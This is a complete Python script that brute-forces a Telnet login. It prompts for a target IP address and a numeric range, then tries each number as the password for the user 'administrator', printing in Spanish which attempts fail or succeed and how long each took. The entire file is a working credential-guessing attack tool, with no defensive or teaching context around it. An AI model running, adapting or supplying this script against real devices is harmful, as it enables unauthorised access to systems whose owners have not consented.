from datetime import datetime
import telnetlib


host = input('Enter the IP address: ')
init_range = int(input('Enter the first digit: '))
final_range = int(input('Enter the last digit: '))
startTime = datetime.now()
for passw in range(init_range, final_range):
    currentTime = datetime.now()

    with telnetlib.Telnet(host) as tn:
        passw = str(passw)
        tn.write(b'\n')
        tn.read_until(b'Username: ')
        tn.write(b'administrator\n')
        tn.read_until(b'Password: ')
        tn.write(passw.encode('ascii') + b'\n' )
        response = tn.read_until(b'invalid', 3)
        if b'invalid' in response:
            print('"administrator" y password "{}" fallo, esto tomo: {}'.format(passw, datetime.now() - currentTime))
        else:
            print('"administrator" y password "{}" funciono!! esto tomo: {}'.format(passw, datetime.now() - currentTime))
            break
print(datetime.now() - startTime)
input('Press any key to exit')
